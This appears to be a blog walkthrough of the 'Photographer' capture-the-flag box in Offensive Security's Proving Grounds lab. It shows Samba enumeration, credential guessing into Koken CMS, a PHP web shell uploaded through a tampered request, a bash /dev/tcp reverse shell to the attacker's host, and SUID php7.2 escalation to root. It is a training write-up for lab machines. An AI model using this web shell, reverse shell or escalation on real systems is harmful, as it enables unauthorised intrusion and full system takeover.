---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/photographer-1,519/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

We start with a simple port scan to determine the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p22,80,139,445,8000 -sV 192.168.177.76
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 20:26 CEST
Nmap scan report for 192.168.177.76
Host is up (0.026s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.69 seconds
                                                                                                                                                                                                                                            
┌──(void㉿kali)-[~/…/offsec/pg/play/amaterasu]
└─$ enum4linux 192.168.177.76 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 26 20:27:40 2023
```

On port `8000` is a `cms` installed named `koken`
```http
GET / HTTP/1.1
Host: 192.168.177.76:8000
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.177.76:8000/content/
Cookie: koken_referrer=%2Ferror%2F404%2F
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Wed, 26 Jul 2023 18:37:28 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 26 Jul 2023 18:21:39 GMT
ETag: "11fb-60167eb30d039-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 4603
Connection: close
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html class="k-source-index k-lens-index">
...
</nav>
	© daisa ahomi | <a href="http://koken.me" target="_blank" title="Koken - a free website publishing system developed for photographers">Built with Koken</a>
	</footer>
	</div>	<!-- close container -->
	<script src="/app/site/themes/common/js/share.js?0.22.24"></script>
...
```

> `Koken` version `0.22.24` is installed
{: .prompt-info }

> Dir busting the web services on port `80` and `8000` did not reveal anything useful.
{: .prompt-danger }

---

# exploitation
## anonymous samba share access
```bash
$ smbclient -L 192.168.177.76                           
Password for [WORKGROUP\void]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            PHOTOGRAPHER

$ smbclient //192.168.177.76/sambashare -U none -p 445
Password for [WORKGROUP\none]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug 20 17:51:08 2020
  ..                                  D        0  Thu Aug 20 18:08:59 2020
  mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 03:22:23 2020

                3300080 blocks of size 1024. 2958792 blocks available
smb: \> get mailsent.txt 
getting file \mailsent.txt of size 503 as mailsent.txt (4.7 KiloBytes/sec) (average 4.7 KiloBytes/sec)
smb: \> get wordpress.bkp.zip 
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (3128.0 KiloBytes/sec) (average 3054.4 KiloBytes/sec)
smb: \> exit
```

Content of `mailsent.txt`
```bash
$ cat mailsent.txt                                        
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

> We get some info here: `daisa@photographer.com`
{: .prompt-info }

Checking for `Koken` exploits
```bash
$ searchsploit koken                                  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)                                                                                                                                                 | php/webapps/48706.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> There seems to be an exploit, but we need to be authenticated to the `cms` first.
{: .prompt-info }

Lets check if we can login to the admin interface (`/admin`) using some credential guessing.  

> Checking the email `daisa@photographer.com` with the password `babygirl` is a success!
{: .prompt-info }

Now lets go through the exploit.

Simple web shell to upload (`image.php.jpg`)
```php
<?php system($_GET['cmd']);?>
```

In the admin dashboard in the bottom right corner we click on `import content` and upload our `image.php.jpg`.

After we done this we go to burp, tamper and repeat the request in the following way.
```http
POST /api.php?/content HTTP/1.1
Host: 192.168.177.76:8000
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
x-koken-auth: cookie
Content-Type: multipart/form-data; boundary=---------------------------42918216767307319031224466817
Content-Length: 1082
Origin: http://192.168.177.76:8000
Connection: close
Referer: http://192.168.177.76:8000/admin/
Cookie: koken_referrer=%2Fcontent%2F; koken_session_ci=9D4w44vzR0fpMkLbQfeLJg3Hwx5y3VHhcCpDbOw7nhzvaKr337UVdaSoXR164BmpUdcn3ONvdZbewIGLhHkG7OxDAxHZLmkeQ8LVZvMWkNugyivs2eqliy%2F3Ksf0qybZ24m0UuRQEmT754RD9GI%2F1BSAcwAp9WiZvBZsQ%2BX8CI%2FBiW%2FwpU4azHvVRtT1XPFFpX74tML6CQC0RUj8Qe7E3aGea1IswGM%2BzGiZ2Sikt82%2FoJFAvp7SUDNP98%2B1I4GfpBPpG6uEGqim%2F7eykyLE4wBqFTR3PJpNZeuwcUnSg2NDIQODHP4t0nOwz9mT6rC2LeaohoXhzskLMnqO7dDsbzhUQKTjAlDRqkzzZfGfZDxHK4jn9CJGgjMQh5R43ozYHHTRT3DgkrFTXJRFG%2B%2FeD2SPbLWxw9BLtjGkfM6Xx15jFQUR8W0rS%2B4JJuswdcEOUsNOePqOkPbZC1uwyABd7bOH2zE5muGBg2ohkbK%2Fb5rW6CSbLYWD0n9nDwOeo3OVUDFVzNbJnS2PFdzvCtrYhXGljAQV9ai%2B8ip2iE9b5S4125O76UzFFtKATYYzx1jHWzU%2B8qujIITpOMf9%2B8HOY3XoAPE0GPSf19v1O%2FoFsivfL1%2BjbaM8XXzsRgjfV82Bsx5szrzv%2FqfUU3L55fJI2gF525Bm3uYzMnzJg5UeemMtgfl2ElVvs1qKVkBOTAAVpKjsF960M1eUp8WV%2FuQwYQRTKSzrIpyOCSPGKtRjBhCmSUPk%2BvHJj2reh5AEdkpx9PvqqUA3Iy3e2wMiBgHJCZ7Stpt%2BpMnuLIR2QVq265Goh12yrUiMvZXKlsfnghdZS4okjQt4ywsYbThPIjqkI%2B%2BGB1H5RXSMI6knJW6RB%2BrT3UFAJ59q1wPhZwSbRTWUMcc3mFm%2B0Ac2UZyZcqQtpykRpPqi02akcUhVqCYh92JvC8Cy48WUqENYql7N4%2F%2BzpLXMZPboabmDZHT0EsgCsSnxASUWHZz6z%2BmpB8D5VtzfAJBKLGmME%2BjbJ08L1YZR2yGCOQOcvXvfY4bxBNdNtEl%2FhkEaz%2FnMzoXGL%2BwY%2FTKBB3tSZryC9Pf0sqeG2LNzlpWzKNJBZ5JMi4EM25gy87COec%2FuYxro34JtMEWLhTC0zxZqZYbiiMLjYTTF1YIgQmdmjUjBs9QvpCANW5haAqgNHltj3mjwVoNv24jJSvG6kvpKJ7Lp5UlpHVJf4M0fVYngguVmE8BHLCXsZM3Y2LarVMKxFCgk5dfwWgP4T6Rm1OO3geg6TmzP1a51kITA327ddb4820d725b7c8fe216d52ccb88439f43d04

-----------------------------42918216767307319031224466817
Content-Disposition: form-data; name="name"

shell.php
-----------------------------42918216767307319031224466817
Content-Disposition: form-data; name="chunk"

0
-----------------------------42918216767307319031224466817
Content-Disposition: form-data; name="chunks"

1
-----------------------------42918216767307319031224466817
Content-Disposition: form-data; name="upload_session_start"

1690397328
-----------------------------42918216767307319031224466817
Content-Disposition: form-data; name="visibility"

public
-----------------------------42918216767307319031224466817
Content-Disposition: form-data; name="license"

all
-----------------------------42918216767307319031224466817
Content-Disposition: form-data; name="max_download"

none
-----------------------------42918216767307319031224466817
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']);?>

-----------------------------42918216767307319031224466817--
```

After we done this, we select the uploaded "image" and hover over the `download` button to identify the location of our shell. Then we check if the shell works

```http
GET /storage/originals/bf/32/shell.php?cmd=id HTTP/1.1
Host: 192.168.177.76:8000
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: koken_referrer=%2Fadmin%2F; koken_session_ci=%2FiRcW9cgxj1XSPRmx96FlG3mS96QODYmeKVVG6Y994DTtkyEy5DmKxYo%2F%2FpC9ksdysOKVt0l%2BuJQvNqjUt4SkHZ7Ifu%2BAmxvMNF2z6zQFEvb%2B5%2FDIxj3VH103lzvvYv0vvo1mjm9%2FpNykqjW71G2SfBluPYrpt07jk3cbd1j81%2FQO6cv2TTkfzlHItvrkQ6ez1tbGqtIGzWkwwrOKJhg%2BBw1bTlslBt7bDzRLTTxGtVQhg6KzzLuJknair1WJOXPY8qgKgDx%2BriD2KwEoHu98BDM6IJA3MSGh1SjScGtOH47HtX6%2F44gDJJq3c%2BFcEdY9CsYmabN4bLqcmrcVpy4Gq3Z3liMHCE867BC5bYBwJnAYivqGhbdxR5PJixvluhCfoJ1JMziYL1W8EKe2wJ39eAYwg7SzVmRjX85%2F1Y7wobQWKjFyDeSv30wR8vRiWfz2vJtALxnBNDjGB8HsxHC%2FNXgc6VditdhfywJFvtHLwcKGaR8ldoZYLMz4Pp2WvP4gEbkMpamxtadUiney7oOn582iA9QOAa%2BiBxUOjq72gbSe16l5s%2Fuxcr9dEOKkcM9bYKDKVftgTbh5VcKkKwUoAoU%2Fp53DMY3YqOfH%2BpUqXWVTgulWrT%2Btfp%2BSBuLDtnHamwtgOIVBAwkLZt6XVx88EI2Lml%2Fruo%2B2Vt9Se4cEWjVfatE6NW0ub8i%2Fq4McagbEmyZYdiFxurkwLeHSAdC1ahawpYXU0b%2BxznTAzEVIFjR4vu9MxoAtuyytUz06lr37TLbVyn2jJZUQ4Z7TLLkePjJVXHyvZTGahWWw4u4OjDiPwTBpqldpuVTgG9DLCpIT396pOKlHJfmGSRmtr6qZPw4Vh782Z3PyqbNWRZW5k2%2FQgM2lCTgLhFun0dY%2Fm696%2Bk2ak7RBqPUrG%2BAWOLNQ4IenFcGH0LNKpm%2FxEiphwvkfFr3RnWbi48Z8dbHJPkBpruGfkPVRVN0Oem2weq09HKpE36lO4Hee8e%2B66y%2FXgP0NK6UkVSflbnhLezalTYtHgbT6NiZwRyi9rDxGV3w0mnhubtGlUHZfRN5XGC%2B66ca678ik3Gt41CZcKlSgYyQUtoneG4q1PijceNEpulN2hqkcZmCpIC7oWkU6LKs7BrF%2BHVrECKwixXnqL2I5a1YYJ%2FyNHlzAcpBPd49i1d6m265wFTl2OOXlPiFCCPuwJHw8pv3N%2Fm7YUFUkklxTeRjQ4bAbGCkBK6ldqTjDXddmdKqhjdLyAnuHTV9GvJB4Rcb2hNJn2q0Pl3XX3he2f0v88b7c26964bfb23616064d4f2f49e99e1782e82c
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Wed, 26 Jul 2023 18:54:31 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 54
Connection: close
Content-Type: text/html; charset=UTF-8

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> The shell works!
{: .prompt-info }

---

# post exploitation
## reverse shell
Start a listener on our attacker machine
```bash
$ nc -lvp 80
listening on [any] 80 ...
```

Trigger reverse shell
payload `bash -c 'bash -i >& /dev/tcp/192.168.45.217/80 0>&1'`
```http
GET /storage/originals/bf/32/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.217/80+0>%261' HTTP/1.1
Host: 192.168.177.76:8000
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: koken_referrer=%2Fadmin%2F; koken_session_ci=%2FiRcW9cgxj1XSPRmx96FlG3mS96QODYmeKVVG6Y994DTtkyEy5DmKxYo%2F%2FpC9ksdysOKVt0l%2BuJQvNqjUt4SkHZ7Ifu%2BAmxvMNF2z6zQFEvb%2B5%2FDIxj3VH103lzvvYv0vvo1mjm9%2FpNykqjW71G2SfBluPYrpt07jk3cbd1j81%2FQO6cv2TTkfzlHItvrkQ6ez1tbGqtIGzWkwwrOKJhg%2BBw1bTlslBt7bDzRLTTxGtVQhg6KzzLuJknair1WJOXPY8qgKgDx%2BriD2KwEoHu98BDM6IJA3MSGh1SjScGtOH47HtX6%2F44gDJJq3c%2BFcEdY9CsYmabN4bLqcmrcVpy4Gq3Z3liMHCE867BC5bYBwJnAYivqGhbdxR5PJixvluhCfoJ1JMziYL1W8EKe2wJ39eAYwg7SzVmRjX85%2F1Y7wobQWKjFyDeSv30wR8vRiWfz2vJtALxnBNDjGB8HsxHC%2FNXgc6VditdhfywJFvtHLwcKGaR8ldoZYLMz4Pp2WvP4gEbkMpamxtadUiney7oOn582iA9QOAa%2BiBxUOjq72gbSe16l5s%2Fuxcr9dEOKkcM9bYKDKVftgTbh5VcKkKwUoAoU%2Fp53DMY3YqOfH%2BpUqXWVTgulWrT%2Btfp%2BSBuLDtnHamwtgOIVBAwkLZt6XVx88EI2Lml%2Fruo%2B2Vt9Se4cEWjVfatE6NW0ub8i%2Fq4McagbEmyZYdiFxurkwLeHSAdC1ahawpYXU0b%2BxznTAzEVIFjR4vu9MxoAtuyytUz06lr37TLbVyn2jJZUQ4Z7TLLkePjJVXHyvZTGahWWw4u4OjDiPwTBpqldpuVTgG9DLCpIT396pOKlHJfmGSRmtr6qZPw4Vh782Z3PyqbNWRZW5k2%2FQgM2lCTgLhFun0dY%2Fm696%2Bk2ak7RBqPUrG%2BAWOLNQ4IenFcGH0LNKpm%2FxEiphwvkfFr3RnWbi48Z8dbHJPkBpruGfkPVRVN0Oem2weq09HKpE36lO4Hee8e%2B66y%2FXgP0NK6UkVSflbnhLezalTYtHgbT6NiZwRyi9rDxGV3w0mnhubtGlUHZfRN5XGC%2B66ca678ik3Gt41CZcKlSgYyQUtoneG4q1PijceNEpulN2hqkcZmCpIC7oWkU6LKs7BrF%2BHVrECKwixXnqL2I5a1YYJ%2FyNHlzAcpBPd49i1d6m265wFTl2OOXlPiFCCPuwJHw8pv3N%2Fm7YUFUkklxTeRjQ4bAbGCkBK6ldqTjDXddmdKqhjdLyAnuHTV9GvJB4Rcb2hNJn2q0Pl3XX3he2f0v88b7c26964bfb23616064d4f2f49e99e1782e82c
Upgrade-Insecure-Requests: 1
```

Catch connection from target
```bash
$ nc -lvp 80
listening on [any] 80 ...
192.168.177.76: inverse host lookup failed: Unknown host
connect to [192.168.45.217] from (UNKNOWN) [192.168.177.76] 51394
bash: cannot set terminal process group (1564): Inappropriate ioctl for device
bash: no job control in this shell
www-data@photographer:/var/www/html/koken/storage/originals/bf/32$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## get first flag
```bash
www-data@photographer:/var/www/html/koken$ cd /home
cd /home
www-data@photographer:/home$ ls -lsah
ls -lsah
total 32K
4.0K drwxr-xr-x  5 root  root  4.0K Aug 20  2020 .
4.0K drwxr-xr-x 24 root  root  4.0K Sep  3  2020 ..
4.0K drwxr-xr-x 17 agi   agi   4.0K Aug 20  2020 agi
4.0K drwxr-xr-x 16 daisa daisa 4.0K Aug 20  2020 daisa
 16K drwx------  2 root  root   16K Feb 28  2019 lost+found
www-data@photographer:/home$ cd agi
cd agi
www-data@photographer:/home/agi$ ls
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
examples.desktop
share
www-data@photographer:/home/agi$ cd ..
cd ..
www-data@photographer:/home$ cd daisa
cd daisa
www-data@photographer:/home/daisa$ ls
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
examples.desktop
local.txt
user.txt
www-data@photographer:/home/daisa$ cat local.txt
cat local.txt
0*******************************4
```

## privilege escalation
Checking for `suid` binaries with the command `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` shows an interesting binary.
```bash
-rwsr-xr-x 1 root root 4883680 Jul  9  2020 /usr/bin/php7.2
...
```

Looking on `gtfobins` shows a simple escalation technique.
```bash
www-data@photographer:/opt$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

> We are `root`! Yay!
{: .prompt-info }

## get second flag
```bash
# cd /root
cd /root
# ls
ls
proof.txt
# cat proof.txt
cat proof.txt
5******************************6
```
  
Pwned! <@:-)
